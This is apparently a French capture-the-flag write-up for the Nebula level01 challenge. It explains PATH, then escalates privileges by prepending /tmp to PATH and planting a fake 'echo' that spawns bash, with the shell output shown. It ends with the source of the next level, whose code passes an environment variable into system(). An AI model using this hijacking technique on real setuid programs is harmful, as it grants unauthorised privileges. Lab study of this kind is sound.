## PATH VARIABLES
Il y a une vulnérabilité dans le programme ci-dessous qui permet l'exécution de programmes arbitraires, pouvez-vous la trouver ?
```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}
```
Ici on voit que ce code execute un programme appele `env` et aussi `echo`
- Mais quand je demande ou sont stockees ces 2 programmes la sur ma machine
```sh
sh-4.2$ which env
/usr/bin/env
sh-4.2$ which echo
/bin/echo
```
Alors que si je revois ma variable PATH(*PATH est une variable d'environnement dans les systèmes d'exploitation Linux et Unix qui spécifie tous les répertoires `bin` et `sbin` dans lesquels sont stockés tous les programmes exécutables. Lorsque l'utilisateur exécute une commande sur le terminal, il demande au shell de rechercher les fichiers exécutables à l'aide de la variable PATH en réponse aux commandes exécutées par l'utilisateur. Le superutilisateur dispose généralement des entrées `/sbin` et `/usr/sbin` pour exécuter facilement les commandes d'administration du système.*)

```sh
sh-4.2$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
```

Dans ce `PATH` j'ai ici plusieurs repertoires, mais plus importants pour moi est `:/bin:` et aussi `:/usr/bin:` car biensur le programme vulnerable execute des outils qui sont dans ces repertoires la

donc la j'ajoute un PATH et je cree un fichier executable
```sh
sh-4.2$ export PATH=/tmp:$PATH
sh-4.2$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games


```



```sh
#include <unistd.h>

int main()
{
system("bash");
}


level01@nebula:/tmp$ gcc -o echo echo.c 
level01@nebula:/tmp$ chmod +x echo
level01@nebula:/tmp$ /home/flag01/flag01 
flag01@nebula:/tmp$ id
uid=998(flag01) gid=1002(level01) groups=998(flag01),1002(level01)
```


```sh
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);
  
  system(buffer);
}
```